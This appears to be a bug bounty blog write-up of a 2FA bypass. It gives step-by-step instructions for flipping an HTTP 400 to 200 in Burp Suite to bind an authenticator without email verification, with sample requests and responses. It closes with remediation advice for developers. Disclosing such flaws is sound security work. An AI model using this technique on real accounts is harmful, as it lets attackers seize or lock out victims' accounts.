---
title: "2FA Bypass via Response Manipulation -- Binding MFA Without Email Verification"
date: 2026-03-03
last_modified_at: 2026-04-02
categories: [Bug Hunting, Web Security]
tags: [2FA, MFA, Response Manipulation, Authentication Bypass, Bug Bounty]
---

# Hey everyone! Hope you're all having a great week.

Today I want to share a fun find from a recent security audit on a platform. It's a classic case of why you should never trust the client's version of the truth, especially when it comes to sensitive security settings like Multi-Factor Authentication (MFA).

I stumbled upon a way to bypass the email verification step completely and bind my own authenticator app to an account. All it took was a little bit of response manipulation in Burp Suite. This one eventually scored a $500 bounty!

---

## The "Aha!" Moment

I was poking around the account settings of the target, specifically looking at how they handle MFA. The app requires you to verify your email via an OTP (One-Time Password) before you can link a TOTP app like Google Authenticator.

Standard stuff, right?

I started testing the verification endpoint. I noticed that when I entered a wrong code, the server returned a 400 error. But something about how the page reacted made me think: "What if I just told the browser that everything is fine?"

It turned out that the frontend was the one deciding whether to show me the QR code based purely on the HTTP status code it received.

---

## Setting the Trap

Here is how the attack goes down:

1. Log in and head over to the MFA security settings.
2. Select the option to add an **Authentication App**.
3. The system sends a code to your registered email. This is the gatekeeper.
4. Instead of checking my email, I just typed in a random 6-digit number like `000000`.
5. I fired up Burp Suite and intercepted the response from the server.
6. The server (rightfully) said: `400 Bad Request`.
7. I used Burp's "Intercept Response" feature to change that `400` into a `200 OK`.
8. The frontend saw the `200 OK`, thought "Great, he verified it!", and immediately showed me the QR code to sync my app.
9. I scanned it, entered my own TOTP code, and the server accepted it. MFA bound.

---

## Technical Breakdown

### 1. The Intercepted Request (Wrong OTP)

I sent this to the server:

```http
POST /api/user/security/passwordless/verify?client_id=[REDACTED] HTTP/2
Host: account.[REDACTED]
Content-Type: application/json

{"code":"000000","action":"change-password"}
```

### 2. The Original Server Response

The server responded with this rejection:

```http
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8

{
  "status": 400,
  "errors": [
    {
      "name": "NO_USER_OR_NO_ACCESS",
      "message": "Invalid code: connection=email, tokenId=..."
    }
  ]
}
```

### 3. The Manipulated Response (The Magic Trick)

I changed the status line and redirected the flow:

```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8

{
  "status": 200,
  "errors": [
    {
      "name": "NO_USER_OR_NO_ACCESS",
      "message": "Invalid code: connection=email, tokenId=..."
    }
  ]
}
```

Even though the "errors" array still says it failed, the frontend was only looking for a successful status code to trigger the next UI state.

### 4. Final Confirmation (Mission Accomplished)

Once the QR code was shown, I finished the binding. The server didn't double-check if the email was actually verified:

```http
HTTP/2 201 Created
Content-Type: application/json; charset=utf-8

{
  "methods": [
    {
      "id": "e8643cac1a3a44e8937b2ffe7aa1de69",
      "type": "totp",
      "label": ""
    }
  ],
  "enabled": true
}
```

---

## Why This is Dangerous

This isn't just about adding your own app. If an attacker gets a hold of a victim's session for even a minute, they can use this bypass to lock the user out or maintain persistent access. Since they don't need access to the victim's email, the "second factor" (something you have) is completely neutralized.

The root of the problem? The binding request (`201 Created` step) didn't require a server-side verified token. It just assumed that if the user reached that step, they must have passed the check.

---

## Lessons for Developers

The golden rule of web security: **Never trust the client.**

1. **Server-Side State**: The server should track the "verification state" internally. The request to finalize MFA should fail unless the server has marked that specific session as "Email Verified."
2. **Atomic Operations**: Link the verification and the binding. Don't make them independent steps that can be skipped.
3. **Don't rely on status codes alone**: Frontend logic shouldn't be the only thing guarding sensitive pages.

This was a simple but effective find. Sometimes the best bugs aren't complex math or deep crypto -- they are just about catching a developer assuming the user will follow the rules.

Happy hunting!

This find earned me a $500 bounty. Not bad for a few minutes of response manipulation.

